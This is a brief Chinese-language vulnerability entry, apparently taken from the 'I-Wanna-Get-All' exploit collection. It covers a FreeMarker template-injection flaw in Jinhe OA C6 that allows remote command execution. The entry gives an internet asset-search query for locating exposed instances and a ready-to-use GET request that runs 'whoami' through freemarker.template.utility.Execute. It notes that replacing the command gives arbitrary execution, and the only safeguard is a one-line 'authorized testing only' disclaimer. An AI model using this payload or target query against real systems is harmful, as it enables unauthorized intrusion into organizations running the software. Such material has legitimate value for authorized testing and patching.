---
source: "R4gd0ll/I-Wanna-Get-All"
---

# 金和OA viewConTemplate 模板注入RCE漏洞

## 漏洞描述

金和OA C6 `jc6/platform/portalwb/portalwb-con-template!viewConTemplate.action` 存在 FreeMarker 服务端模板注入（SSTI）漏洞。模板参数未经处理直接渲染，攻击者注入 FreeMarker 表达式即可执行任意系统命令。

## 影响版本

```
金和OA C6
```

## 网络测绘

```
app="金和OA"
```

## 漏洞复现

向模板预览接口提交 FreeMarker 表达式：

```
GET /jc6/platform/portalwb/portalwb-con-template!viewConTemplate.action?template=${"freemarker.template.utility.Execute"?new()("whoami")} HTTP/1.1
```

服务端将表达式求值并回显命令执行结果；替换命令内容即得任意命令执行（RCE）。

> 仅限授权测试。PoC 逻辑提取自 I-Wanna-Get-All 集成利用工具对应模块。
